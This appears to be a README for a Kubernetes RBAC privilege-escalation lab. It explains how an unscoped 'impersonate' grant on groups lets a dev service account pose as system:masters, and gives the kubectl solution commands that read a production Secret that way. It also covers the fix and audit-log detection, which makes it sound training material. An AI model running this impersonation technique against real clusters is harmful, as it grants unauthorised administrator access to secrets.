# sa-impersonate - user/group impersonation escalation (RBAC)

An RBAC privilege-escalation lab in the nested-cluster shape. The student lands
in a `dev`-namespace shell whose service account holds only the `impersonate`
verb, and must read a Secret in `production` their own identity has no grant to
see.

## Shape

Everything is in the module's manifest bundle
(`services/backend/internal/labs/modules/sa-impersonate.yaml`), applied into the
session's disposable nested k3s cluster - no per-module image (the foothold uses
the shared `k8labs-foothold` image, same as `ns-escape`). The flag is bait, not
a secret (see `_template`).

## The flaw

A `ClusterRole` grants `impersonate` on `users` and `groups`, bound to the
`dev/sa-imper` service account via a `ClusterRoleBinding`. Impersonation lets a
caller act as another identity (`kubectl --as` / `--as-group`). Because the grant
covers `groups` without a `resourceNames` restriction, the account can name
`system:masters` - the group bound to `cluster-admin` by a default, protected
`ClusterRoleBinding` that the API server re-creates if deleted and that no Role
or namespace can narrow. The account's own lack of read access is therefore
irrelevant.

## Solution (spoiler)

```sh
kubectl auth can-i --list                      # spot: users/groups [impersonate]
kubectl get secrets -n production              # as yourself: Forbidden
# borrow the superuser group; --as is mandatory, --as-group carries the privilege:
kubectl get secret flag -n production \
  --as=nobody --as-group=system:masters \
  -o jsonpath='{.data.flag}' | base64 -d
# k8labs{impersonate_a_group_to_become_system_masters}
```

## The fix

Remove the `impersonate` grant, or scope it: impersonation of a specific named
user (`resourceNames: ["some-user"]`) is occasionally justified; `impersonate` on
`groups` at large never is, because it reaches `system:masters`. Treat the verb
in the same review tier as cluster-admin.

## What a defender sees

Every impersonated request carries the `Impersonate-User` / `Impersonate-Group`
headers, surfaced in the API server audit log as `impersonatedUser`. The signal
is an ordinarily-unprivileged identity issuing an `ImpersonateRequest` that names
a privileged group - here, a `dev` service account claiming `system:masters`.
Under Kata in prod, host-level Tetragon cannot see inside the nested cluster, so
this is an audit-log/in-cluster-telemetry observation, not a host-eBPF one - the
same design note as `ns-escape`.
